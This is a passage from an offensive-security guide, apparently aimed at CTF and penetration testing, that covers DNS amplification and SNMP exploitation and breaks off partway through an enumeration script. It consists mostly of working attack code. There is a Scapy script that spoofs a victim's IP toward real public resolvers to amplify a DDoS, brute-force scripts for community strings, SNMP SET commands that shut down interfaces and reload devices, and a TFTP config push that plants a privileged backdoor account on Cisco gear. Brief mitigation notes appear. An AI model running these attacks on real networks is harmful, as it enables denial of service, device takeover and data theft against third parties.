# Shodan query to find public resolvers
# Query: port:53 dns
# Returns thousands of public resolvers
```

#### Amplification Query Construction

**ANY query amplification (legacy, now rate-limited):**

```bash
# Query for all record types
dig @ns1.target.com target.com ANY

# Response includes all records, maximizing response size
# [Unverified] Modern DNS implementations limit ANY query size

# Query format for spoofing:
# Set source IP to victim
# Send ANY query to open resolver
# Resolver responds to victim with amplified data
```

**DNSSEC amplification (most effective):**

```bash
# Query with DNSSEC flag requests signatures
dig @ns1.target.com target.com +dnssec

# Response includes RRSIG records (large signatures)
# DNSKEY records
# Additional cryptographic data
# Maximizes response size

# Response often 1000+ bytes for single query
# 50-100x amplification ratio
```

**TXT record amplification:**

```bash
# TXT records can contain large data
dig @ns1.target.com target.com TXT

# If zone contains large TXT records
# Response amplified

# Example TXT records in zone:
# target.com TXT "v=spf1 include:providers.target.com include:other.target.com -all"
# target.com TXT "verification=0123456789abcdef0123456789abcdef"

# Multiple TXT records increase response size
```

#### [Unverified] Open Resolver Detection at Scale

```bash
# Identifying botnet-controllable resolvers

# Mass scanning
# Query random domain from many IPs
# Collect responses
# Identify pattern indicating open resolver

# ZoneH open resolver list
# Public databases of known open resolvers
# Attacker downloads and uses directly

# Shodan API
# Query for DNS servers
# Filter by response characteristics
# Identify amplification candidates
```

#### DNS Amplification Attack Execution

**Using DNS amplification tool (dnsampump, etc.):**

```bash
# [Unverified] Specialized tools construct amplification traffic

# Example command structure:
dnsamp -i victim_ip -o open_resolver_list.txt -q ANY -d target.com -t 600

# Sends queries from open resolvers spoofed from victim
# Resolvers amplify and respond to victim
# Generates large traffic volume
```

**Manual amplification with Scapy:**

```python
#!/usr/bin/env python3
from scapy.all import IP, UDP, DNS, DNSQR, send
import random

def create_amplified_query(resolver_ip, victim_ip, domain):
    """Create DNS query spoofed from victim to public resolver"""
    
    # DNS query with DNSSEC flag for amplification
    pkt = IP(src=victim_ip, dst=resolver_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=53) / \
          DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
    
    # Enable DNSSEC for larger response
    pkt[DNS].flags = 0x0100
    
    return pkt

# Execute amplification
victim_ip = "203.0.113.50"  # Target of attack
domain = "google.com"
resolvers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]  # Open resolvers

for resolver in resolvers:
    for i in range(100):  # Multiple queries per resolver
        pkt = create_amplified_query(resolver, victim_ip, domain)
        send(pkt, verbose=False)

print(f"Sent {len(resolvers) * 100} amplified DNS queries")
```

#### Amplification Attack Traffic Patterns

**Volume characteristics:**

```bash
# Monitor victim network during attack
tcpdump -i eth0 port 53

# Observe:
# - High packet rate (thousands/second)
# - Large packet sizes (500-4000 bytes)
# - Many source IPs (thousands of resolvers)
# - Destination: victim IP
# - Protocol: UDP/DNS

# Attack volume calculation
# 1000 resolvers × 100 queries/sec × 2000 bytes/response
# = 200 Mbps traffic (modest attack)
# Scale to millions of resolvers = Gbps-scale DDoS
```

#### Mitigation and Detection

**DNS response rate limiting:**

```bash
# Nameserver configuration
# Limit response rate per source IP

# BIND configuration:
rate-limit {
    responses-per-second 5;
    referrals-per-second 5;
};

# Limits responses to 5 per second per source
# Effective mitigation for amplification
```

**Anycast and traffic scrubbing:**

```bash
# DDoS mitigation services use anycast networks
# Intercept amplification traffic before reaching victim

# Scrubbing centers analyze DNS patterns
# Drop suspicious DNS responses
# Forward legitimate traffic

# Services: Cloudflare, Akamai, Level3 DDoS protection
```

**Source IP spoofing prevention:**

```bash
# BCP 38 (RFC 2827) ingress filtering
# ISPs filter packets with invalid source IPs

# If ISP implements ingress filtering
# Attacker cannot spoof source IPs
# Amplification attacks prevented

# Check if ISP implements filtering
# Scan tool: spoofcheck
# curl https://www.bcp38.info/index.php/Main_Page
```

---

**DNS exploitation summary:**

Zone transfers expose entire infrastructure, poisoning attacks redirect users to malicious sites, cache poisoning affects resolver users at scale, DNSSEC bypasses require deep protocol understanding, and amplification attacks generate massive DDoS volumes. Combined, these vectors make DNS a critical exploitation target in CTF scenarios and real-world assessments requiring comprehensive reconnaissance and traffic analysis capabilities.

---

## SNMP Exploitation

### Community String Brute Force

SNMP (Simple Network Management Protocol) uses community strings as authentication. These are essentially passwords transmitted in plaintext, making them vulnerable to brute force and interception.

**Basic SNMP Enumeration**

```bash
# Check if SNMP is running
nmap -sU -p 161,162 target_ip
nmap -sU -p 161 --open target_ip

# SNMP version detection
nmap -sU -p 161 --script snmp-info target_ip
nmap -sU -p 161 -sV target_ip

# Check SNMP with default community strings
snmpwalk -v1 -c public target_ip
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip

# Quick test for common community strings
for community in public private manager; do
  echo "[*] Testing: $community"
  snmpwalk -v2c -c $community target_ip system 2>&1 | grep -v "Timeout"
done
```

**Community String Brute Force with onesixtyone**

```bash
# Basic brute force with onesixtyone
onesixtyone target_ip -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# Multiple targets
onesixtyone -c community_strings.txt -i targets.txt

# Custom wordlist
cat > snmp_communities.txt << EOF
public
private
manager
admin
community
snmp
cisco
default
router
switch
monitor
read
write
test
EOF

onesixtyone target_ip -c snmp_communities.txt

# With verbose output
onesixtyone -d target_ip -c snmp_communities.txt

# Fast scan mode
onesixtyone -w 10 target_ip -c community_strings.txt
```

**Community String Brute Force with Hydra**

```bash
# SNMPv1/v2c brute force
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt snmp://target_ip

# With specific community string list
hydra -P snmp_communities.txt snmp://target_ip

# Multiple targets
hydra -P snmp_communities.txt snmp://targets.txt

# With timing adjustments
hydra -P snmp_communities.txt snmp://target_ip -t 4 -w 30

# Try both v1 and v2c
for version in 1 2c; do
  echo "[*] Testing SNMPv${version}"
  hydra -P snmp_communities.txt snmp://target_ip -V
done
```

**Community String Brute Force with Metasploit**

```bash
# Using metasploit SNMP scanner
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_login
set RHOSTS target_ip
set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
set THREADS 10
run
exit
EOF

# Enumerate after finding valid community
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target_ip
set COMMUNITY found_community_string
run
exit
EOF
```

**Community String Brute Force with Nmap**

```bash
# SNMP brute force script
nmap -sU -p 161 --script snmp-brute target_ip

# With custom wordlist
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target_ip

# Multiple targets
nmap -sU -p 161 --script snmp-brute -iL targets.txt

# Adjust timing
nmap -sU -p 161 --script snmp-brute --script-args brute.threads=8 target_ip
```

**Custom Community String Brute Force Script**

```bash
# Python SNMP brute force
python3 << 'EOF'
from pysnmp.hlapi import *
import sys

def snmp_brute(target, community_list):
    with open(community_list, 'r') as f:
        for community in f:
            community = community.strip()
            try:
                iterator = getCmd(
                    SnmpEngine(),
                    CommunityData(community),
                    UdpTransportTarget((target, 161), timeout=2, retries=0),
                    ContextData(),
                    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))
                )
                
                errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
                
                if errorIndication:
                    print(f"[-] Failed: {community}")
                elif errorStatus:
                    print(f"[-] Failed: {community}")
                else:
                    print(f"[+] FOUND! Community string: {community}")
                    for varBind in varBinds:
                        print(f"    {varBind[0]} = {varBind[1]}")
                    return community
            except Exception as e:
                print(f"[!] Error with {community}: {str(e)}")
                continue
    return None

# Usage
snmp_brute("target_ip", "snmp_communities.txt")
EOF
```

**SNMPv3 Brute Force**

```bash
# SNMPv3 uses username/password instead of community strings
# Enumerate SNMPv3 users
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.protocol=3 target_ip

# Using hydra for SNMPv3
hydra -l admin -P passwords.txt snmpv3://target_ip

# Using metasploit for SNMPv3
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS target_ip
set VERSION 3
run
exit
EOF

# Manual SNMPv3 authentication test
snmpwalk -v3 -l authPriv -u username -a SHA -A authpass -x AES -X privpass target_ip
```

### MIB Enumeration

Management Information Base (MIB) contains structured information about network devices that can be queried via SNMP.

**Basic MIB Walking**

```bash
# Full MIB walk with SNMPv2c
snmpwalk -v2c -c public target_ip

# System information
snmpwalk -v2c -c public target_ip system

# Specific OID queries
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.1  # System info
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.2  # Interfaces
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.4  # IP info
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.6  # TCP connections
snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25 # Host resources

# Output to file for analysis
snmpwalk -v2c -c public target_ip > snmp_full_dump.txt
```

**Targeted MIB Enumeration**

```bash
# System description and information
snmpget -v2c -c public target_ip SNMPv2-MIB::sysDescr.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysObjectID.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysUpTime.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysContact.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysName.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysLocation.0

# Network interfaces
snmpwalk -v2c -c public target_ip IF-MIB::ifDescr
snmpwalk -v2c -c public target_ip IF-MIB::ifType
snmpwalk -v2c -c public target_ip IF-MIB::ifPhysAddress
snmpwalk -v2c -c public target_ip IF-MIB::ifAdminStatus
snmpwalk -v2c -c public target_ip IF-MIB::ifOperStatus

# IP addresses and routing
snmpwalk -v2c -c public target_ip IP-MIB::ipAdEntAddr
snmpwalk -v2c -c public target_ip IP-MIB::ipAdEntNetMask
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteNextHop

# TCP connections
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnState
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnLocalAddress
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnLocalPort
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnRemAddress

# UDP connections
snmpwalk -v2c -c public target_ip UDP-MIB::udpLocalAddress
snmpwalk -v2c -c public target_ip UDP-MIB::udpLocalPort
```

**Windows-Specific MIB Enumeration**

```bash
# Enumerate Windows users
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25

# Enumerate running processes
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunName

# Enumerate installed software
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWInstalledName

# Storage information
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrStorageDescr
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrStorageSize

# Device information
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDeviceDescr

# File system paths
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrFSMountPoint

# Open shares (Windows)
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.27
```

**Linux-Specific MIB Enumeration**

```bash
# Running processes
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::prNames
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::prErrMessage

# Memory information
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::memory

# Disk information
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::dskPath
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::dskPercent

# Load average
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::laLoad

# System statistics
snmpwalk -v2c -c public target_ip UCD-SNMP-MIB::systemStats
```

**Cisco-Specific MIB Enumeration**

```bash
# Cisco device information
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.2.1  # Cisco local variables
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.9.46.1.3.1  # VTP VLAN info

# Configuration file location
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.2

# VLANs
snmpwalk -v2c -c public target_ip CISCO-VTP-MIB::vtpVlanState

# CDP (Cisco Discovery Protocol) neighbors
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheDeviceId
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheAddress
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCachePlatform

# Interface statistics
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.2.2.1.1.6  # Interface descriptions
```

**Automated MIB Enumeration with Tools**

```bash
# Using snmp-check
snmp-check -c public target_ip
snmp-check -c public -v 2c target_ip
snmp-check -c public target_ip -w  # Write results to HTML

# Using snmpwalk with detailed output
snmpwalk -v2c -c public -O n target_ip > snmp_numeric_oids.txt
snmpwalk -v2c -c public -O e target_ip > snmp_extended.txt

# Using onesixtyone for quick enumeration
onesixtyone target_ip -c public -d

# Using metasploit
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target_ip
set COMMUNITY public
set VERSION 2c
run
exit
EOF

# Using snmpbulkwalk (faster for large MIBs)
snmpbulkwalk -v2c -c public target_ip
```

**Parsing and Analyzing MIB Data**

```bash
# Extract IP addresses
snmpwalk -v2c -c public target_ip | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u

# Extract usernames (Windows)
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25 | cut -d'"' -f2

# Extract process names
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunName | cut -d':' -f4 | sort -u

# Extract network connections
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnLocalAddress | awk '{print $4}'
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnRemAddress | awk '{print $4}'

# Parse and format output
python3 << 'EOF'
import re

def parse_snmp_output(filename):
    with open(filename, 'r') as f:
        for line in f:
            # Extract OID and value
            match = re.search(r'([\d\.]+) = (.+)', line)
            if match:
                oid, value = match.groups()
                print(f"OID: {oid}\nValue: {value}\n")

parse_snmp_output('snmp_full_dump.txt')
EOF
```

### SNMP Set Command Abuse

SNMP SET commands allow modification of device configurations if the community string has write access (typically "private").

**Testing for Write Access**

```bash
# Test if write access is available
snmpset -v2c -c private target_ip SNMPv2-MIB::sysContact.0 s "test@test.com"
snmpset -v2c -c private target_ip SNMPv2-MIB::sysLocation.0 s "TestLocation"
snmpset -v2c -c private target_ip SNMPv2-MIB::sysName.0 s "TestName"

# Try common write community strings
for community in private write admin manager secret; do
  echo "[*] Testing write access with: $community"
  snmpset -v2c -c $community target_ip SNMPv2-MIB::sysContact.0 s "test" 2>&1 | grep -i "timeout\|error"
done

# Using metasploit to test write access
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_set
set RHOSTS target_ip
set COMMUNITY private
set SPOOFED_IP 192.168.1.100
run
exit
EOF
```

**Configuration Modification via SNMP SET**

```bash
# Modify system information
snmpset -v2c -c private target_ip SNMPv2-MIB::sysContact.0 s "attacker@evil.com"
snmpset -v2c -c private target_ip SNMPv2-MIB::sysLocation.0 s "Compromised"
snmpset -v2c -c private target_ip SNMPv2-MIB::sysName.0 s "pwned-host"

# [Inference] Modifying these values may trigger alerts in monitored environments

# Check if modification was successful
snmpget -v2c -c public target_ip SNMPv2-MIB::sysContact.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysLocation.0
```

**Interface Manipulation**

```bash
# Enumerate interfaces first
snmpwalk -v2c -c public target_ip IF-MIB::ifDescr

# Disable network interface (DoS attack)
# ifAdminStatus: 1 = up, 2 = down
snmpset -v2c -c private target_ip IF-MIB::ifAdminStatus.1 i 2

# Re-enable interface
snmpset -v2c -c private target_ip IF-MIB::ifAdminStatus.1 i 1

# Check interface status
snmpget -v2c -c public target_ip IF-MIB::ifAdminStatus.1
snmpget -v2c -c public target_ip IF-MIB::ifOperStatus.1
```

**Cisco IOS Configuration via SNMP**

```bash
# [Inference] Cisco devices can be configured via SNMP with appropriate OIDs

# Upload configuration file (Cisco)
# This requires knowledge of specific Cisco MIBs
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 a "tftp_server_ip"
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 s "config_file.cfg"
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1

# Reload device
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.2.9.9.0 i 2

# Modify running configuration
# [Unverified] Specific OIDs vary by device and IOS version
```

**Creating Backdoor via SNMP**

```bash
# Add SNMP community string (if device supports)
# [Inference] This creates a persistent backdoor
# Specific implementation depends on device type

# For some Linux systems with net-snmp
# Modify /etc/snmp/snmpd.conf via SNMP (if writable)
# This is device-specific and may not work on all systems

# Windows SNMP registry modification (advanced)
# [Unverified] Requires specific Windows SNMP MIB support
```

**TFTP Configuration Replacement**

```bash
# Setup TFTP server
mkdir /tftp
atftpd --daemon --port 69 /tftp

# Create malicious config
cat > /tftp/evil_config.cfg << EOF
username hacker privilege 15 secret cisco123
line vty 0 4
login local
transport input all
EOF

# Trigger device to download config via SNMP
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1  # Set protocol to TFTP
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 3  # Set operation to merge
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 a "attacker_ip"  # TFTP server
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 s "evil_config.cfg"  # Filename
snmpset -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1  # Activate transfer
```

### Default SNMP Credentials

**Common Default Community Strings**

```bash
# Most common defaults
cat > snmp_default_communities.txt << EOF
public
private
community
snmp
cisco
default
manager
admin
secret
read
write
monitor
test
guest
security
network
mngt
netman
ilmi
ILMI
EOF

# Test all defaults
while IFS= read -r community; do
  echo "[*] Testing: $community"
  snmpwalk -v2c -c "$community" target_ip system 2>&1 | grep -q "iso.3.6.1.2.1.1" && echo "[+] FOUND: $community"
done < snmp_default_communities.txt
```

**Vendor-Specific Default Community Strings**

```bash
# Cisco defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip
snmpwalk -v2c -c cisco target_ip

# HP/3Com defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c admin target_ip
snmpwalk -v2c -c manager target_ip

# Dell defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip

# Juniper defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip

# Netgear defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip

# D-Link defaults
snmpwalk -v2c -c public target_ip
snmpwalk -v2c -c private target_ip
snmpwalk -v2c -c admin target_ip
```

**SNMPv3 Default Credentials**

```bash
# SNMPv3 common defaults
# Format: username:authpassword:privpassword

# Test common SNMPv3 accounts
snmpwalk -v3 -l authPriv -u admin -a SHA -A admin123 -x AES -X admin123 target_ip
snmpwalk -v3 -l authPriv -u administrator -a SHA -A administrator -x AES -X administrator target_ip
snmpwalk -v3 -l authPriv -u snmp -a MD5 -A snmpsnmp -x DES -X snmpsnmp target_ip
snmpwalk -v3 -l authNoPriv -u readonly -a MD5 -A readonly target_ip
snmpwalk -v3 -l authNoPriv -u public -a MD5 -A public target_ip

# No authentication (if allowed)
snmpwalk -v3 -l noAuthNoPriv -u public target_ip
```

**Automated Default Credential Testing**

```bash
# Using metasploit
msfconsole -q << EOF
use auxiliary/scanner/snmp/snmp_login
set RHOSTS target_ip
set BLANK_PASSWORDS true
set BRUTEFORCE_SPEED 5
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
run
exit
EOF

# Using nmap
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target_ip

# Using onesixtyone with default wordlist
onesixtyone target_ip -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

### Information Disclosure via SNMP

**Sensitive System Information**

```bash
# Complete system information dump
snmpwalk -v2c -c public target_ip > system_info.txt

# Hostname and domain
snmpget -v2c -c public target_ip SNMPv2-MIB::sysName.0
snmpwalk -v2c -c public target_ip SNMPv2-MIB::sysName

# System uptime (can indicate patch level)
snmpget -v2c -c public target_ip SNMPv2-MIB::sysUpTime.0

# Operating system details
snmpget -v2c -c public target_ip SNMPv2-MIB::sysDescr.0

# Contact and location information
snmpget -v2c -c public target_ip SNMPv2-MIB::sysContact.0
snmpget -v2c -c public target_ip SNMPv2-MIB::sysLocation.0
```

**Network Configuration Disclosure**

```bash
# All IP addresses on device
snmpwalk -v2c -c public target_ip IP-MIB::ipAdEntAddr

# Network interfaces
snmpwalk -v2c -c public target_ip IF-MIB::ifDescr
snmpwalk -v2c -c public target_ip IF-MIB::ifPhysAddress  # MAC addresses

# Routing table
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteNextHop
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteDest
snmpwalk -v2c -c public target_ip IP-MIB::ipRouteIfIndex

# ARP table
snmpwalk -v2c -c public target_ip IP-MIB::ipNetToMediaPhysAddress
snmpwalk -v2c -c public target_ip IP-MIB::ipNetToMediaNetAddress

# DNS servers
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters | grep -i dns
```

**Active Network Connections**

```bash
# TCP connections
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnLocalAddress
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnLocalPort
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnRemAddress
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnRemPort
snmpwalk -v2c -c public target_ip TCP-MIB::tcpConnState

# UDP connections
snmpwalk -v2c -c public target_ip UDP-MIB::udpLocalAddress
snmpwalk -v2c -c public target_ip UDP-MIB::udpLocalPort

# Listening ports
snmpwalk -v2c -c public target_ip | grep -E "(tcpConnLocalPort|udpLocalPort)"
```

**User and Account Enumeration**

```bash
# Windows user accounts
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25

# Extract usernames
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25 | cut -d'"' -f2 | sort -u

# Currently logged in users (Windows)
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunName | grep -i "explorer.exe"
```

**Running Processes and Services**

```bash
# All running processes
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunName

# Process paths
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunPath

# Process parameters/command lines
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters

# Installed software
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWInstalledName

# Parse for interesting processes
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunName | grep -iE "(sql|admin|backup|password|credential|vnc|rdp)"
```

**Storage and File System Information**

```bash
# Storage devices
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrStorageDescr

# Disk usage
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrStorageSize
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrStorageUsed

# File system mount points
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrFSMountPoint

# Device types
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDeviceDescr
```

**Network Share Enumeration (Windows)**

```bash
# Enumerate Windows shares via SNMP
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.27

# Share names
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.27.1.1

# Share paths
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.27.1.2

# Parse share information
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.27 | grep -v "No Such Object"
```

**Cisco-Specific Information Disclosure**

```bash
# VLANs configuration
snmpwalk -v2c -c public target_ip CISCO-VTP-MIB::vtpVlanState

# CDP neighbors (network topology)
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheDeviceId
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheAddress
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCachePlatform
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheDevicePort
snmpwalk -v2c -c public target_ip CISCO-CDP-MIB::cdpCacheCapabilities

# Configuration file locations
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.2

# Extract running config via SNMP (if enabled)
# [Inference] This may expose passwords and sensitive configuration
snmpwalk -v2c -c private target_ip 1.3.6.1.4.1.9.9.96.1.1.1.1.1

# Interface descriptions (may contain sensitive info)
snmpwalk -v2c -c public target_ip IF-MIB::ifAlias

# Cisco environmental monitoring
snmpwalk -v2c -c public target_ip CISCO-ENVMON-MIB::ciscoEnvMonTemperatureStatusDescr
snmpwalk -v2c -c public target_ip CISCO-ENVMON-MIB::ciscoEnvMonSupplyStatusDescr

# Access control lists (ACLs)
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.9.1  # Cisco IP access lists
```

**SNMP Trap Information**

```bash
# Enumerate trap destinations
snmpwalk -v2c -c public target_ip SNMP-NOTIFICATION-MIB::snmpNotifyTag
snmpwalk -v2c -c public target_ip SNMP-TARGET-MIB::snmpTargetAddrTAddress

# SNMP trap configuration
snmpwalk -v2c -c public target_ip SNMP-TARGET-MIB::snmpTargetAddrRowStatus
snmpwalk -v2c -c public target_ip SNMP-COMMUNITY-MIB::snmpCommunityName

# [Inference] Trap destinations may reveal management servers
```

**Hardware Information Disclosure**

```bash
# Hardware details
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDeviceDescr
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDeviceType

# Processor information
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrProcessorLoad

# Physical disks and partitions
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDiskStorageAccess
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrDiskStorageMedia

# Network card information
snmpwalk -v2c -c public target_ip IF-MIB::ifSpeed
snmpwalk -v2c -c public target_ip IF-MIB::ifMtu
snmpwalk -v2c -c public target_ip IF-MIB::ifPhysAddress
```

**Credentials and Sensitive Data in Process Parameters**

```bash
# Extract command line parameters (may contain passwords)
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters

# Search for sensitive information in running processes
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters | grep -iE "(password|passwd|pwd|credential|secret|key|token|api)"

# Database connection strings
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters | grep -iE "(database|mysql|postgresql|mssql|oracle)"

# Backup locations
snmpwalk -v2c -c public target_ip HOST-RESOURCES-MIB::hrSWRunParameters | grep -iE "(backup|bak|archive)"
```

**Printer Information Disclosure**

```bash
# Printer-specific MIB queries
snmpwalk -v2c -c public printer_ip 1.3.6.1.2.1.43  # Printer MIB

# Printer description
snmpget -v2c -c public printer_ip 1.3.6.1.2.1.25.3.2.1.3.1

# Page counts (can reveal printer usage)
snmpwalk -v2c -c public printer_ip 1.3.6.1.2.1.43.10.2.1.4

# Printer ready jobs
snmpwalk -v2c -c public printer_ip 1.3.6.1.2.1.43.5.1.1

# [Inference] Some printers may expose document names or user information
snmpwalk -v2c -c public printer_ip HOST-RESOURCES-MIB::hrDeviceDescr
```

**VPN and Authentication Information**

```bash
# VPN users (device-specific)
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.9.392  # Cisco VPN MIB

# RADIUS authentication servers
snmpwalk -v2c -c public target_ip RADIUS-AUTH-CLIENT-MIB::radiusAuthServerAddress
snmpwalk -v2c -c public target_ip RADIUS-AUTH-CLIENT-MIB::radiusAuthClientServerPortNumber

# TACACS+ configuration
snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.9.10.56  # Cisco TACACS+ MIB
```

**Automated Information Gathering Scripts**

```bash
# Comprehensive SNMP enumeration script
cat > snmp_enum.sh << 'SCRIPT'
#!/bin/bash

TARGET=$1
COMMUNITY=$2

if [ -z "$TARGET" ] || [ -z "$COMMUNITY" ]; then
    echo "Usage: $0 <target_ip> <community_string>"
    exit 1
fi

echo "[*] SNMP Enumeration for $TARGET with community: $COMMUNITY"
echo "=================================================="

echo -e "\n[+] System Information"
snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysDescr.0 2>/dev/null
snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysName.0 2>/dev/null
snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysContact.0 2>/dev/null
snmpget -v2c -c $COMMUNITY $TARGET SNMPv2-MIB::sysLocation.0 2>/dev/null

echo -e "\n[+] Network Interfaces"
snmpwalk -v2c -c $COMMUNITY $TARGET IF-MIB::ifDescr 2>/dev/null

echo -e "\n[+] IP Addresses"
snmpwalk -v2c -c $COMMUNITY $TARGET IP-MIB::ipAdEntAddr 2>/dev/null

echo -e "\n[+] Routing Table"
